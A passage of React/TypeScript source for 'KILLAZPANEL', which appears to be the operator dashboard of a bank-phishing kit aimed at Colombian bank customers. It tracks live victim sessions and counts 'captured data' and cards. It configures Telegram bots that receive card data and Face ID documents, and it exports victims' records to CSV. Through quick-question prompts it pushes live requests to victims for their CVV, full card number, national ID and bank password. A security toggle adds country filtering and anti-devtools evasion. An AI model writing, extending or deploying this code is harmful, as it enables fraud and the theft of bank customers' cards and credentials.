    if (n.includes("agrario") || n.includes("agraria")) return { bg: "bg-lime-500/20", text: "text-lime-300", label: "AGRARIO" };
    if (n.includes("gnb") || n.includes("sudameris")) return { bg: "bg-indigo-500/20", text: "text-indigo-300", label: "GNB" };
    if (n.includes("nequi")) return { bg: "bg-fuchsia-500/20", text: "text-fuchsia-300", label: "NEQUI" };
    if (n.includes("nubank") || n.includes("nu ")) return { bg: "bg-violet-500/20", text: "text-violet-300", label: "NU" };
    if (n.includes("falabella")) return { bg: "bg-green-600/20", text: "text-green-200", label: "FALABELLA" };
    // Generic fallback: first word, gray
    const label = bankName.split(" ")[0].toUpperCase().slice(0, 10);
    return { bg: "bg-gray-500/15", text: "text-gray-300", label };
  };

  // Card brand SVG logos
  const getCardBrandSVG = (cardNumber?: string, cardBin?: string): React.ReactElement | null => {
    const num = (cardNumber || cardBin || "").replace(/\s/g, "");
    if (!num) return null;
    // Visa: starts with 4
    if (num.startsWith("4")) return (
      <svg viewBox="0 0 48 16" className="h-4 w-auto" xmlns="http://www.w3.org/2000/svg">
        <text x="0" y="13" fontFamily="Arial Black, Arial" fontWeight="900" fontSize="14" fill="#1A1F71" letterSpacing="-0.5">VISA</text>
      </svg>
    );
    // Mastercard: starts with 51-55 or 2221-2720
    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return (
      <svg viewBox="0 0 38 24" className="h-5 w-auto" xmlns="http://www.w3.org/2000/svg">
        <circle cx="14" cy="12" r="10" fill="#EB001B"/>
        <circle cx="24" cy="12" r="10" fill="#F79E1B"/>
        <path d="M19 5.27A10 10 0 0 1 23.73 12 10 10 0 0 1 19 18.73 10 10 0 0 1 14.27 12 10 10 0 0 1 19 5.27z" fill="#FF5F00"/>
      </svg>
    );
    // Amex: starts with 34 or 37
    if (/^3[47]/.test(num)) return (
      <svg viewBox="0 0 48 16" className="h-4 w-auto" xmlns="http://www.w3.org/2000/svg">
        <rect width="48" height="16" rx="2" fill="#2E77BC"/>
        <text x="4" y="12" fontFamily="Arial Black, Arial" fontWeight="900" fontSize="9" fill="white" letterSpacing="0.3">AMEX</text>
      </svg>
    );
    // Diners: starts with 300-305, 36, 38
    if (/^3(?:0[0-5]|[68])/.test(num)) return (
      <svg viewBox="0 0 32 24" className="h-5 w-auto" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="none" stroke="#0079BE" strokeWidth="2"/>
        <circle cx="20" cy="12" r="10" fill="none" stroke="#0079BE" strokeWidth="2"/>
      </svg>
    );
    return null;
  };

  // Get unique bank names for filter dropdown
  const uniqueBanks = useMemo(() => {
    const banks = new Set<string>();
    sessions.forEach(s => { if (s.bankName) banks.add(s.bankName); });
    return Array.from(banks).sort();
  }, [sessions]);

  // Get unique card categories for filter dropdown
  const uniqueCategories = useMemo(() => {
    const cats = new Set<string>();
    sessions.forEach(s => {
      const cat = s.cardCategory || s.data?.cardCategory || "";
      if (cat) cats.add(cat.toUpperCase());
    });
    return Array.from(cats).sort();
  }, [sessions]);

  // Apply filters + search
  const filteredSessions = useMemo(() => {
    let result = sessions;
    
    // Search filter
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(s => 
        (s.email || "").toLowerCase().includes(q) ||
        (s.ipAddress || "").toLowerCase().includes(q) ||
        (s.cardNumber || "").toLowerCase().includes(q) ||
        (s.cardBin || "").toLowerCase().includes(q) ||
        (s.bankName || "").toLowerCase().includes(q) ||
        (s.data?.bankUser || "").toLowerCase().includes(q)
      );
    }
    
    // Status filter
    switch (filter) {
      case "online": result = result.filter(s => s.isOnline); break;
      case "offline": result = result.filter(s => !s.isOnline); break;
      case "with-data": result = result.filter(s => hasData(s)); break;
      case "no-data": result = result.filter(s => !hasData(s)); break;
    }
    
    // Bank filter
    if (bankFilter !== "all") {
      result = result.filter(s => s.bankName === bankFilter);
    }
    
    // Category filter
    if (categoryFilter !== "all") {
      result = result.filter(s => {
        const cat = (s.cardCategory || s.data?.cardCategory || "").toUpperCase();
        return cat.includes(categoryFilter);
      });
    }
    
    // Sort: online first, then by selected sort
    result = [...result].sort((a, b) => {
      if (a.isOnline && !b.isOnline) return -1;
      if (!a.isOnline && b.isOnline) return 1;
      if (sortBy === "actividad") return b.lastActivity - a.lastActivity;
      return b.connectedAt - a.connectedAt;
    });
    
    return result;
  }, [sessions, filter, bankFilter, categoryFilter, searchQuery, sortBy]);

  // Count online sessions
  const onlineCount = sessions.filter(s => s.isOnline).length;
  const offlineCount = sessions.filter(s => !s.isOnline).length;

  // ═══════════════════════════════════════
  // PIN SCREEN + 2FA
  // ═══════════════════════════════════════
  if (!isAuthenticated) {
    // 2FA Code Screen
    if (twoFAStep) {
      return (
        <div className={`min-h-[100dvh] flex items-center justify-center p-4 ${theme.bg}`}>
          <div className="w-full max-w-sm">
            <div className={`backdrop-blur-xl rounded-2xl p-8 shadow-2xl shadow-black/50 ${theme.cardBg} border ${theme.border}`}>
              <div className="text-center mb-8">
                <div className="w-20 h-20 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-blue-500/20 to-purple-500/20 border border-blue-500/30 flex items-center justify-center">
                  <span className="text-3xl">🔐</span>
                </div>
                <h1 className={`text-2xl font-black tracking-tight ${theme.text}`}>2FA</h1>
                <p className={`text-sm mt-2 ${theme.textSecondary}`}>Código enviado a Telegram</p>
              </div>
              <form onSubmit={handle2FASubmit} className="space-y-4">
                <div className="relative">
                  <input
                    type="text"
                    value={twoFACode}
                    onChange={(e) => setTwoFACode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                    placeholder="000000"
                    className={`w-full ${theme.inputBg} border ${theme.border} rounded-xl px-4 py-4 ${theme.text} text-center text-2xl tracking-[0.5em] font-mono focus:outline-none focus:border-blue-500/50 focus:ring-2 focus:ring-blue-500/20 placeholder:text-gray-500 placeholder:tracking-[0.3em] transition-all`}
                    maxLength={6}
                    autoFocus
                  />
                </div>
                {twoFAError && (
                  <div className="bg-red-500/10 border border-red-500/20 rounded-lg px-3 py-2 text-center">
                    <p className="text-red-400 text-xs font-medium">{twoFAError}</p>
                  </div>
                )}
                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-blue-600 to-purple-500 hover:from-blue-500 hover:to-purple-400 text-white font-semibold py-3.5 rounded-xl transition-all active:scale-[0.97] shadow-lg shadow-blue-500/20"
                >
                  Verificar
                </button>
                <p className={`text-center text-xs ${theme.textSecondary}`}>⏳ Válido por 5 minutos</p>
              </form>
            </div>
          </div>
        </div>
      );
    }

    // PIN Screen
    return (
      <div className={`min-h-[100dvh] flex items-center justify-center p-4 ${theme.bg}`}>
        <div className="w-full max-w-sm">
          <div className={`backdrop-blur-xl rounded-2xl p-8 shadow-2xl shadow-black/50 ${theme.cardBg} border ${theme.border}`}>
            <div className="text-center mb-8">
              <img src={LOGO_URL} alt="KILLAZPANEL" className="w-20 h-20 mx-auto mb-4 rounded-2xl shadow-lg shadow-red-500/20 object-cover" />
              <h1 className={`text-2xl font-black tracking-tight ${theme.text}`}>KILLAZPANEL</h1>
              <p className={`text-sm mt-2 ${theme.textSecondary}`}>Ingresa el PIN para continuar</p>
            </div>
            <form onSubmit={handlePinSubmit} className="space-y-4">
              <div className="relative">
                <input
                  type="password"
                  value={pinInput}
                  onChange={(e) => setPinInput(e.target.value)}
                  placeholder="• • • • • •"
                  className={`w-full ${theme.inputBg} border ${theme.border} rounded-xl px-4 py-4 ${theme.text} text-center text-2xl tracking-[0.5em] font-mono focus:outline-none focus:border-red-500/50 focus:ring-2 focus:ring-red-500/20 placeholder:text-gray-500 placeholder:tracking-[0.3em] transition-all`}
                  maxLength={10}
                  autoFocus
                />
              </div>
              {pinError && (
                <div className="bg-red-500/10 border border-red-500/20 rounded-lg px-3 py-2 text-center">
                  <p className="text-red-400 text-xs font-medium">{pinError}</p>
                </div>
              )}
              <button
                type="submit"
                className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white font-semibold py-3.5 rounded-xl transition-all active:scale-[0.97] shadow-lg shadow-red-500/20"
              >
                Acceder
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════
  // MAIN DASHBOARD
  // ═══════════════════════════════════════
  return (
    <div className={`min-h-[100dvh] ${theme.bg} ${theme.text}`}>
      {/* Top Bar */}
      <header className={`sticky top-0 z-50 ${theme.headerBg} backdrop-blur-xl border-b ${theme.border}`}>
        <div className="px-3 sm:px-6 py-3 flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 sm:gap-4 min-w-0">
            <div className="flex items-center gap-2 sm:gap-3">
              <img src={LOGO_URL} alt="KILLAZPANEL" className="w-7 h-7 sm:w-9 sm:h-9 rounded-lg object-cover shadow-md" />
              <h1 className={`text-sm sm:text-lg font-black tracking-tight ${theme.text} hidden sm:block`}>KILLAZPANEL</h1>
            </div>
            <div className={`flex items-center gap-1.5 sm:gap-2 px-2 sm:px-3 py-1 rounded-full text-[10px] sm:text-xs font-medium border ${
              connected 
                ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" 
                : "bg-red-500/10 text-red-400 border-red-500/20"
            }`}>
              <div className={`w-2 h-2 rounded-full ${connected ? "bg-emerald-400 animate-pulse" : "bg-red-400"}`} />
              <span className="hidden sm:inline">{connected ? "En línea" : "Desconectado"}</span>
            </div>
          </div>
          <div className="flex items-center gap-1.5 sm:gap-3">
            {/* Security toggle */}
            <button
              onClick={toggleSecurity}
              disabled={securityLoading}
              className={`px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
                securityEnabled
                  ? "bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30"
                  : "bg-white/5 text-gray-500 border-white/5 hover:bg-white/10"
              } ${securityLoading ? "opacity-50 cursor-wait" : ""}`}
              title={securityEnabled ? "Seguridad ACTIVADA (filtro país + rate limit + anti-devtools)" : "Seguridad DESACTIVADA"}
            >
              {securityEnabled ? "🛡️" : "🔓"}<span className="hidden sm:inline ml-1">{securityEnabled ? "SEC ON" : "SEC OFF"}</span>
            </button>
            {/* Sound toggle */}
            <button
              onClick={() => setSoundEnabled(!soundEnabled)}
              className={`px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
                soundEnabled
                  ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                  : "bg-white/5 text-gray-500 border-white/5"
              }`}
              title={soundEnabled ? "Sonido activado" : "Sonido desactivado"}
            >
              {soundEnabled ? "🔊" : "🔇"}
            </button>
            {/* Auto-scroll toggle */}
            <button
              onClick={() => setAutoScrollEnabled(!autoScrollEnabled)}
              className={`px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
                autoScrollEnabled
                  ? "bg-blue-500/10 text-blue-400 border-blue-500/20"
                  : "bg-white/5 text-gray-500 border-white/5"
              }`}
              title={autoScrollEnabled ? "Auto-scroll activado" : "Auto-scroll desactivado"}
            >
              {autoScrollEnabled ? "📍" : "🚫"}
            </button>
            {/* Theme selector */}
            <div className="relative">
              <button
                onClick={() => setShowThemeMenu(!showThemeMenu)}
                className="px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
                title="Cambiar tema"
              >
                🎨
              </button>
              {showThemeMenu && (
                <div className={`absolute right-0 top-full mt-2 w-40 rounded-xl shadow-2xl border z-[200] overflow-hidden ${theme.cardBg} ${theme.border}`}>
                  {(Object.keys(THEME_PRESETS) as PanelTheme[]).map((key) => (
                    <button
                      key={key}
                      onClick={() => { setPanelTheme(key); setShowThemeMenu(false); }}
                      className={`w-full text-left px-4 py-2.5 text-xs font-medium transition-all hover:bg-white/10 flex items-center gap-2 ${
                        panelTheme === key ? "bg-white/10 text-white" : theme.textSecondary
                      }`}
                    >
                      <span className={`w-3 h-3 rounded-full border ${
                        key === "dark" ? "bg-[#0c0c0f] border-gray-600" :
                        key === "light" ? "bg-gray-100 border-gray-300" :
                        key === "midnight" ? "bg-[#0a0e1a] border-blue-500/50" :
                        key === "hacker" ? "bg-black border-green-500/50" :
                        "bg-[#0a0000] border-red-500/50"
                      }`} />
                      {THEME_PRESETS[key].name}
                      {panelTheme === key && <span className="ml-auto">✓</span>}
                    </button>
                  ))}
                </div>
              )}
            </div>
            <button
              onClick={() => { setShowConfigModal(true); loadConfigData(); }}
              className="px-2 sm:px-3 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
              title="Configuraciones"
            >
              ⚙️<span className="hidden sm:inline ml-1">Config</span>
            </button>
            <button
              onClick={() => { setStatsMode(!statsMode); if (statsMode) { /* closing */ } else { setHistoryMode(false); } }}
              className={`px-2 sm:px-4 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
                statsMode 
                  ? "bg-cyan-500/10 text-cyan-400 border-cyan-500/20" 
                  : "bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
              }`}
            >
              {statsMode ? "←" : "🏦"}<span className="hidden sm:inline ml-1">{statsMode ? "Volver" : "Stats"}</span>
            </button>
            <button
              onClick={() => { setHistoryMode(!historyMode); if (!historyMode) { loadHistory(); setStatsMode(false); } }}
            className={`px-2 sm:px-4 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
              historyMode 
                ? "bg-amber-500/10 text-amber-400 border-amber-500/20" 
                : "bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
            }`}
          >
            {historyMode ? "←" : "📜"}<span className="hidden sm:inline ml-1">{historyMode ? "Volver" : "Historial"}</span>
          </button>
            <button
              onClick={() => { setTrafficMode(!trafficMode); if (!trafficMode) { loadTrafficData(); setHistoryMode(false); setStatsMode(false); } }}
              className={`px-2 sm:px-4 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
                trafficMode 
                  ? "bg-violet-500/10 text-violet-400 border-violet-500/20" 
                  : "bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
              }`}
            >
              {trafficMode ? "←" : "🌐"}<span className="hidden sm:inline ml-1">{trafficMode ? "Volver" : "Tráfico"}</span>
            </button>
          <button
            onClick={() => { sessionStorage.removeItem("admin-auth"); setIsAuthenticated(false); }}
              className="px-2 sm:px-3 py-1.5 sm:py-2 bg-white/5 hover:bg-red-500/10 text-gray-400 hover:text-red-400 rounded-lg text-[10px] sm:text-xs font-medium transition-all border border-white/5 hover:border-red-500/20"
            >
              Cerrar
            </button>
          </div>
        </div>

        {/* Stats Bar */}
        <div className={`px-3 sm:px-6 py-2 border-t ${theme.border} flex items-center gap-2 sm:gap-4 flex-wrap`}>
          <StatBadge icon="👁" label="Clicks/Visitas" value={metrics.totalSessions} color="blue" />
          <StatBadge icon="📊" label="Datos Capturados" value={metrics.totalWithData} color="emerald" />
          <StatBadge icon="💳" label="Tarjetas" value={metrics.totalCards} color="purple" />
          <div className={`w-px h-5 ${theme.border}`} />
          <StatBadge icon="🟢" label="Online" value={onlineCount} color="emerald" />
          <StatBadge icon="⚫" label="Offline" value={offlineCount} color="gray" />
          <StatBadge icon="📡" label="Total Sesiones" value={sessions.length} color="amber" />
          <div className={`w-px h-5 ${theme.border}`} />
          {/* Clear buttons */}
          <button
            onClick={() => setConfirmClear("clicks")}
            className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-orange-500/10 text-orange-400 border-orange-500/20 hover:bg-orange-500/20 transition-all active:scale-95"
          >
            Borrar Clicks
          </button>
          <button
            onClick={() => setConfirmClear("data")}
            className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20 transition-all active:scale-95"
          >
            Borrar Datos
          </button>
          {sessions.length > 0 && (
            <button
              onClick={() => exportToCSV(sessions, `sesiones_activas_${new Date().toISOString().slice(0, 10)}.csv`)}
              className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-emerald-500/10 text-emerald-400 border-emerald-500/20 hover:bg-emerald-500/20 transition-all active:scale-95"
              title="Exportar sesiones activas a CSV"
            >
              📊 CSV
            </button>
          )}
        </div>
      </header>

      {/* Confirm Clear Modal */}
      {confirmClear && (
        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setConfirmClear(null)}>
          <div className={`${theme.cardBg} border ${theme.border} rounded-2xl p-6 max-w-sm w-full shadow-2xl`} onClick={e => e.stopPropagation()}>
            <div className="text-center mb-6">
              <div className="w-14 h-14 mx-auto mb-4 rounded-full bg-red-500/10 flex items-center justify-center border border-red-500/20">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-7 h-7 text-red-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                </svg>
              </div>
              <h3 className={`text-lg font-bold ${theme.text} mb-2`}>
                {confirmClear === "clicks" ? "Borrar Clicks" : "Borrar Datos Capturados"}
              </h3>
              <p className={`text-sm ${theme.textSecondary}`}>
                {confirmClear === "clicks"
                  ? "Esto limpiar\u00e1 las sesiones activas del panel y resetear\u00e1 el contador de clicks/visitas. El historial en base de datos NO se borrar\u00e1."
                  : "Esto eliminar\u00e1 TODOS los datos capturados del historial, sesiones activas y contadores. Esta acci\u00f3n no se puede deshacer."
                }
              </p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={() => setConfirmClear(null)}
                className={`flex-1 px-4 py-2.5 rounded-xl text-sm font-medium ${theme.inputBg} ${theme.textSecondary} border ${theme.border} hover:opacity-80 transition-all`}
              >
                Cancelar
              </button>
              <button
                onClick={confirmClear === "clicks" ? clearClicks : clearData}
                className="flex-1 px-4 py-2.5 rounded-xl text-sm font-medium bg-red-600 text-white hover:bg-red-500 transition-all active:scale-95"
              >
                Confirmar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Config Modal */}
      {showConfigModal && (
        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setShowConfigModal(false)}>
          <div className={`${theme.cardBg} border ${theme.border} rounded-2xl p-6 max-w-lg w-full shadow-2xl`} onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-amber-500/10 flex items-center justify-center border border-amber-500/20">
                  <span className="text-xl">⚙️</span>
                </div>
                <div>
                  <h3 className={`text-base font-bold ${theme.text}`}>Configuraciones</h3>
                  <p className={`text-xs ${theme.textSecondary}`}>Edita tokens y credenciales del panel</p>
                </div>
              </div>
              <button onClick={() => setShowConfigModal(false)} className="text-gray-500 hover:text-gray-300 text-xl leading-none">✕</button>
            </div>

            <div className="space-y-4">
              {/* Admin PIN */}
              <div>
                <label className={`block text-xs font-semibold mb-1.5 ${theme.textSecondary}`}>🔐 Clave del Panel (PIN)</label>
                <input
                  type="text"
                  value={configForm.adminPin}
                  onChange={e => setConfigForm(f => ({ ...f, adminPin: e.target.value }))}
                  className={`w-full px-3 py-2 rounded-lg border ${theme.border} ${theme.inputBg} ${theme.text} text-sm font-mono focus:outline-none focus:ring-1 focus:ring-amber-500/50`}
                  placeholder="Nuevo PIN del panel"
                />
              </div>

              {/* Telegram Datos */}
              <div className={`p-3 rounded-xl border ${theme.border} space-y-3`}>
                <p className={`text-xs font-bold ${theme.text} flex items-center gap-2`}><span>📊</span> Telegram — Datos / Tarjetas</p>
                <div>
                  <label className={`block text-[11px] mb-1 ${theme.textSecondary}`}>Bot Token</label>
                  <input
                    type="text"
                    value={configForm.telegramBotToken}
                    onChange={e => setConfigForm(f => ({ ...f, telegramBotToken: e.target.value }))}
                    className={`w-full px-3 py-2 rounded-lg border ${theme.border} ${theme.inputBg} ${theme.text} text-xs font-mono focus:outline-none focus:ring-1 focus:ring-blue-500/50`}
                    placeholder="123456789:AAF..."
                  />
                </div>
                <div>
                  <label className={`block text-[11px] mb-1 ${theme.textSecondary}`}>Chat ID</label>
                  <input
                    type="text"
                    value={configForm.telegramChatId}
                    onChange={e => setConfigForm(f => ({ ...f, telegramChatId: e.target.value }))}
                    className={`w-full px-3 py-2 rounded-lg border ${theme.border} ${theme.inputBg} ${theme.text} text-xs font-mono focus:outline-none focus:ring-1 focus:ring-blue-500/50`}
                    placeholder="-100123456789"
                  />
                </div>
              </div>

              {/* Telegram Face ID */}
              <div className={`p-3 rounded-xl border ${theme.border} space-y-3`}>
                <p className={`text-xs font-bold ${theme.text} flex items-center gap-2`}><span>🦾</span> Telegram — Face ID / Documentos</p>
                <div>
                  <label className={`block text-[11px] mb-1 ${theme.textSecondary}`}>Bot Token</label>
                  <input
                    type="text"
                    value={configForm.telegramFaceidBotToken}
                    onChange={e => setConfigForm(f => ({ ...f, telegramFaceidBotToken: e.target.value }))}
                    className={`w-full px-3 py-2 rounded-lg border ${theme.border} ${theme.inputBg} ${theme.text} text-xs font-mono focus:outline-none focus:ring-1 focus:ring-purple-500/50`}
                    placeholder="123456789:AAF..."
                  />
                </div>
                <div>
                  <label className={`block text-[11px] mb-1 ${theme.textSecondary}`}>Chat ID</label>
                  <input
                    type="text"
                    value={configForm.telegramFaceidChatId}
                    onChange={e => setConfigForm(f => ({ ...f, telegramFaceidChatId: e.target.value }))}
                    className={`w-full px-3 py-2 rounded-lg border ${theme.border} ${theme.inputBg} ${theme.text} text-xs font-mono focus:outline-none focus:ring-1 focus:ring-purple-500/50`}
                    placeholder="-100123456789"
                  />
                </div>
              </div>

              {/* Test Telegram */}
              <div className={`p-3 rounded-xl border ${theme.border} space-y-2`}>
                <p className={`text-xs font-bold ${theme.text} flex items-center gap-2`}><span>📡</span> Probar Telegram</p>
                <p className={`text-[11px] ${theme.textSecondary}`}>Envía un mensaje de prueba para verificar que el token y chat ID funcionan</p>
                <button
                  onClick={testTelegram}
                  disabled={testTelegramStatus.loading}
                  className="w-full px-3 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold transition-all disabled:opacity-50 active:scale-95"
                >
                  {testTelegramStatus.loading ? "Enviando..." : "📡 Probar Telegram"}
                </button>
                {testTelegramStatus.result && <p className="text-emerald-400 text-[11px] break-all">{testTelegramStatus.result}</p>}
                {testTelegramStatus.error && <p className="text-red-400 text-[11px]">{testTelegramStatus.error}</p>}
              </div>

              {/* Webhook Registration */}
              <div className={`p-3 rounded-xl border ${theme.border} space-y-2`}>
                <p className={`text-xs font-bold ${theme.text} flex items-center gap-2`}><span>🔗</span> Webhook Telegram</p>
                <p className={`text-[11px] ${theme.textSecondary}`}>Registra el webhook para recibir mensajes de texto (necesario para el botón 💬 TEXTO)</p>
                <button
                  onClick={registerWebhook}
                  disabled={webhookStatus.loading}
                  className="w-full px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition-all disabled:opacity-50 active:scale-95"
                >
                  {webhookStatus.loading ? "Registrando..." : "🔗 Registrar Webhook"}
                </button>
                {webhookStatus.result && <p className="text-emerald-400 text-[11px] break-all">{webhookStatus.result}</p>}
                {webhookStatus.error && <p className="text-red-400 text-[11px]">{webhookStatus.error}</p>}
              </div>

              {/* Error / Success */}
              {configError && <p className="text-red-400 text-xs text-center">{configError}</p>}
              {configSaved && <p className="text-emerald-400 text-xs text-center font-semibold">✅ Configuración guardada correctamente</p>}

              {/* Buttons */}
              <div className="flex gap-3 pt-1">
                <button
                  onClick={() => setShowConfigModal(false)}
                  className={`flex-1 px-4 py-2.5 rounded-xl border ${theme.border} ${theme.textSecondary} text-sm font-medium hover:bg-white/5 transition-all`}
                >
                  Cancelar
                </button>
                <button
                  onClick={saveConfigData}
                  disabled={configLoading}
                  className="flex-1 px-4 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-black text-sm font-bold transition-all disabled:opacity-50 active:scale-95"
                >
                  {configLoading ? "Guardando..." : "Guardar cambios"}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Custom Text Modal with Quick Questions */}
      {showCustomTextModal && (
        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setShowCustomTextModal(false)}>
          <div className={`${theme.cardBg} border ${theme.border} rounded-2xl p-6 max-w-md w-full shadow-2xl`} onClick={e => e.stopPropagation()}>
            <div className="text-center mb-4">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-blue-500/10 flex items-center justify-center border border-blue-500/20">
                <span className="text-2xl">💬</span>
              </div>
              <h3 className={`text-lg font-bold ${theme.text}`}>Texto Personalizado</h3>
              <p className={`text-xs ${theme.textSecondary} mt-1`}>Selecciona una pregunta rápida o escribe tu propio mensaje</p>
            </div>

            {/* Quick Questions */}
            <div className="grid grid-cols-2 gap-2 mb-4">
              {[
                { label: "🏠 Dirección", text: "Por favor ingrese su dirección de residencia completa" },
                { label: "📅 F. Expedición", text: "Ingrese la fecha de expedición de su cédula (DD/MM/AAAA)" },
                { label: "🎂 F. Nacimiento", text: "Ingrese su fecha de nacimiento (DD/MM/AAAA)" },
                { label: "💳 Cupo Disponible", text: "Ingrese el cupo disponible actual de su tarjeta" },
                { label: "🆔 Cédula", text: "Ingrese su número de cédula de ciudadanía" },
                { label: "💳 Número Tarjeta", text: "Ingrese el número completo de su tarjeta (16 dígitos)" },
                { label: "🔐 CVV", text: "Ingrese el código de seguridad (CVV) de su tarjeta" },
                { label: "📱 Teléfono", text: "Ingrese su número de teléfono celular" },
                { label: "📧 Email", text: "Ingrese su correo electrónico" },
                { label: "🏦 Clave Banco", text: "Ingrese su clave de acceso al portal bancario" },
              ].map((q) => (
                <button
                  key={q.label}
                  onClick={() => setCustomTextInput(q.text)}
                  className={`px-3 py-2 rounded-lg text-[11px] font-medium border transition-all active:scale-95 text-left ${theme.inputBg} ${theme.text} ${theme.border} hover:opacity-80`}
                >
                  {q.label}
                </button>
              ))}
            </div>

            {/* Custom input */}
            <textarea
              value={customTextInput}
              onChange={(e) => setCustomTextInput(e.target.value)}
              placeholder="Escribe tu mensaje personalizado..."
              className={`w-full px-4 py-3 rounded-xl text-sm ${theme.inputBg} ${theme.text} border ${theme.border} focus:outline-none focus:ring-2 focus:ring-blue-500/30 resize-none`}
              rows={3}
            />

            <div className="flex gap-3 mt-4">
              <button
                onClick={() => setShowCustomTextModal(false)}
                className={`flex-1 px-4 py-2.5 rounded-xl text-sm font-medium ${theme.inputBg} ${theme.textSecondary} border ${theme.border} hover:opacity-80 transition-all`}
              >
                Cancelar
              </button>
              <button
                onClick={() => {
                  if (customTextInput.trim() && customTextTarget) {
                    socketRef.current?.emit("admin:send-custom-text", { sessionId: customTextTarget, message: customTextInput.trim() });
                    setShowCustomTextModal(false);
                    setCustomTextInput("");
                  }
                }}
                className="flex-1 px-4 py-2.5 rounded-xl text-sm font-medium bg-blue-600 text-white hover:bg-blue-500 transition-all active:scale-95"
              >
                Enviar
              </button>
            </div>
          </div>
        </div>
      )}

      <main className="p-6">
        {/* ═══ HISTORY MODE ═══ */}
        {historyMode && (
          <div className="space-y-4">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-amber-500/10 flex items-center justify-center border border-amber-500/20">
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <div>
                  <h2 className={`text-lg font-bold ${theme.text}`}>Historial</h2>
                  <p className={`text-xs ${theme.textSecondary}`}>{historyTotal} sesiones registradas (Página {historyPage}/{historyTotalPages})</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                {/* Auto-refresh toggle */}
                <button
                  onClick={() => setAutoRefreshHistory(!autoRefreshHistory)}
                  className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium border transition-all active:scale-95 ${
                    autoRefreshHistory
                      ? "bg-blue-500/10 text-blue-400 border-blue-500/20"
                      : "bg-white/5 text-gray-400 border-white/5 hover:bg-white/10"
                  }`}
                >
                  {autoRefreshHistory ? "⟳ Auto" : "⟳ Auto"}
                </button>

                {/* Export current page CSV */}
                {historySessions.length > 0 && (
                  <button
                    onClick={() => exportToCSV(historySessions, `historial_pagina_${historyPage}.csv`)}
                    className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-all active:scale-95"
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                    </svg>
                    CSV Pág
                  </button>
                )}

                {/* Export ALL CSV */}
                {historyTotal > 0 && (
                  <button
                    onClick={async () => {
                      try {
                        const pin = sessionStorage.getItem("admin-pin") || "";
                        const params = new URLSearchParams({ page: "1", pageSize: String(historyTotal) });
                        if (historySearchQuery.trim()) params.set("search", historySearchQuery.trim());
                        const res = await fetch(`/api/sessions/history?${params.toString()}`, {
                          headers: { "x-admin-pin": pin },
                        });
                        const data = await res.json();
